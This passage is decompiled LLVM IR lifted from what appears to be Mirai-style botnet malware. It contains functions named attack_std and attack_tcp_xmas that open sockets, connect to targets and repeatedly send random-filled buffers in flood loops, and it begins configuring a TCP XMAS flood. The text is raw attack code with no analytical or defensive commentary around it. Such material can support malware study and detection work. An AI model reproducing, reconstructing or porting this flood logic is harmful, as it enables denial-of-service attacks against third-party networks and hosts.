  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb85:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 65535, i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_9848 = and i32 %v0_983c, 65280
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v5_9854 = call i32 @llvm.bswap.i32(i32 %v0_983c)
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
  %v7_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v6_9964, i32 3, i32 65535, i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v5_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v6_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v5_99c0, i32 7, i32 65535, i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v6_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v6_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
  %v5_99dc = inttoptr i32 %v0_99c4 to i32*
  %v6_99dc = call i32 @attack_get_opt_int(i32 %v0_99d4, i32* %v5_99dc, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
